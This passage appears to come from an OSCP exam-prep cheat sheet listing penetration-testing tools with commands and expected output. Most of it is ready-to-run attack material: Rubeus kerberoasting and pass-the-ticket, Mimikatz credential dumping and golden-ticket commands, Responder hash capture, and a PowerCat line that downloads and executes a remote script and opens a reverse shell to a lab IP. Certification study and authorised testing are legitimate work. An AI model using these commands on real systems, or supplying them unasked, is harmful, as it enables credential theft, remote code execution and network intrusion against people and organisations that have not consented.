# Upload .zip file
```
**What to look for**:
- Nodes appearing in graph
- Attack paths visualized

**Scenario 3: Custom Queries**
```cypher
# All computers
MATCH (m:Computer) RETURN m

# All users
MATCH (m:User) RETURN m

# Active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
**What to look for**:
- Session nodes
- Paths to Domain Admins
- Kerberoastable users

**Key Output Indicators**:
- Lines between nodes = relationships
- Red nodes = high value targets
- Skull icon = owned principals

### 7.2 PowerView - PowerShell AD Enumeration

**What**: PowerShell-based AD enumeration
**When**: When you have AD credentials

```powershell
Import-Module .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomainController

# Users
Get-NetUser
Get-NetUser | select cn,lastlogon,pwdlastset

# Groups
Get-NetGroup
Get-NetGroup "Domain Admins" | select member

# Computers
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# SPN accounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Local admin
Find-LocalAdminAccess

# Shares
Find-DomainShare
```
**What to look for**:
- Domain Admins group members
- Kerberoastable users (have SPN)
- Computers with local admin access
- File shares with interesting data

**Key Output Indicators**:
```
GroupName: Domain Admins
Member:
CN=Administrator,CN=Users,DC=domain,DC=com
CN=jeffadmin,CN=Users,DC=domain,DC=com

SPN Accounts:
iis_service      HTTP/web04.domain.com
```

### 7.3 Rubeus - Kerberos Attacks

**What**: Kerberos attack tool for Windows
**When**: When you need to attack Kerberos authentication

**Scenario 1: AS-REP Roasting**
```bash
Rubeus.exe asreproast /nowrap
```
**What to look for**:
- Users with no preauth
- AS-REP hash for cracking

**Scenario 2: Kerberoasting**
```bash
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
**What to look for**:
- Service accounts
- TGS-REP hash for cracking

**Scenario 3: Pass the Ticket**
```bash
Rubeus.exe ptt /ticket:ticket.kirbi
```
**What to look for**:
- `[+] Ticket successfully imported!` - success
- Access service with ticket

**Scenario 4: Overpass the Hash**
```bash
Rubeus.exe asktgt /user:user /domain:domain.com /ntlm:NTLM_HASH /ptt
```
**What to look for**:
- TGT obtained
- Ticket in memory

**Key Output Indicators**:
```
[*] Action: AS-REP roasting
[*] Target Domain          : domain.com
[*] SamAccountName         : user
[*] DistinguishedName      : CN=user,CN=Users,DC=domain,DC=com
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash: $krb5asrep$...
```

### 7.4 Mimikatz - Credential Dumping

**What**: Credential extraction tool
**When**: When you have SYSTEM privileges

```cmd
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /user:domain\user
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt
```
**What to look for**:
- `OK` after privilege::debug
- `NTLM` hash values
- `msv` section contains hashes
- `kerberos` section contains tickets

**Key Output Indicators**:
```
User Name         : user
Domain            : DOMAIN
NTLM     : 1234567890abcdef1234567890abcdef
```

---

## 8. File Transfer & Shell Tools

### 8.1 Python HTTP Server - File Hosting

**What**: Simple HTTP server for file hosting
**When**: You need to transfer files to/from target

```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# With specific directory
cd /path/to/files && python3 -m http.server 80
```
**What to look for**:
- `Serving HTTP on 0.0.0.0 port 80` - server ready
- GET requests in logs

### 8.2 PowerCat - PowerShell Netcat

**What**: PowerShell implementation of netcat
**When**: PowerShell reverse shell on Windows

```powershell
# On Kali (serve)
python3 -m http.server 8000

# On Windows (download and execute)
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.50.5:8000/powercat.ps1')
powercat -c 192.168.50.5 -p 4444 -e powershell
```
**What to look for**:
- Successful download
- Netcat listener catches shell

### 8.3 Socat - Multipurpose Relay

**What**: Netcat alternative with advanced features
**When**: Need more complex port forwarding

```bash
# Reverse shell
socat TCP-LISTEN:4444,fork TCP:192.168.50.5:4444

# Port forwarding
socat TCP-LISTEN:8080,fork TCP:internal_host:80

# Encrypted
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:internal_host:80
```
**What to look for**:
- `listening on` - port open
- Connected messages

---

## 9. Wireless & Network Tools

### 9.1 Responder - LLMNR/NBT-NS Poisoning

**What**: LLMNR/NBT-NS poisoning and credential capture
**When**: On internal networks where LLMNR/NBT-NS is enabled

```bash
sudo responder -I eth0
```
**What to look for**:
- `[+] Listening for events` - running
- `[SMB] NTLMv2-SSP Client` - hashes captured
- `[HTTP] NTLMv2-SSP Client` - web authentication attempts

**Key Output Indicators**:
```
[SMB] NTLMv2-SSP Client   : 192.168.50.100
[SMB] NTLMv2-SSP Username : DOMAIN\user
[SMB] NTLMv2-SSP Hash     : user::DOMAIN:...
```

---

## 10. Automation & Scripting Tools

### 10.1 Tmux / Screen - Terminal Multiplexer

**What**: Multiple terminal sessions in one window
**When**: Running multiple tools simultaneously

```bash
# tmux start
tmux new -s oscp

# tmux split
Ctrl+b "  (horizontal)
Ctrl+b %  (vertical)

# tmux windows
Ctrl+b c  (new)
Ctrl+b n  (next)
Ctrl+b p  (previous)

# screen start
screen -S oscp

# screen detach
Ctrl+a d
```

### 10.2 Script - Terminal Recording

**What**: Record terminal sessions
**When**: Need to document everything for report

```bash
script -a session_$(date +%Y%m%d_%H%M%S).log
# ... commands ...
exit
```

---

## 11. Quick Reference Tool Matrix

### 11.1 Tool Selection by Phase

| Phase | Tools |
|-------|-------|
| **Recon** | Nmap, AutoRecon, Gobuster, WhatWeb, WPScan, Nikto |
| **Enumeration** | enum4linux, smbclient, snmpwalk, dnsenum, hydra |
| **Exploitation** | Metasploit, MSFVenom, SearchSploit, SQLMap |
| **PrivEsc** | LinPEAS, WinPEAS, PowerUp, LSE |
| **Post-Exploitation** | Mimikatz, Rubeus, PowerView, BloodHound |
| **Lateral Movement** | CrackMapExec, Impacket, PsExec, Evil-WinRM |
| **Pivoting** | Chisel, Socat, SSH, Proxychains |
| **Cracking** | Hashcat, John |

### 11.2 Tool Output Indicators

| Tool | Success Indicator | Failure Indicator |
|------|-------------------|-------------------|
| **Nmap** | `open` in STATE column | `closed` or `filtered` |
| **Gobuster** | Status 200, 301 | Status 404 |
| **Hydra** | `[+]` or login:password found | `STATUS_LOGIN_FAILED` |
| **CrackMapExec** | `[+]` with (Pwn3d!) | `[-]` or STATUS_LOGON_FAILURE |
| **Hashcat** | `Status: Cracked` | `Status: Exhausted` |
| **John** | `DONE` with passwords | `No password hashes loaded` |
| **Metasploit** | `Meterpreter session X opened` | `Exploit failed` |
| **LinPEAS** | 🔴 Red findings | No red findings |

---

**Remember**: The right tool at the right time is key. Always check the OSCP exam guidelines for prohibited tools before the exam. Practice with each tool to understand its output and know what to look for.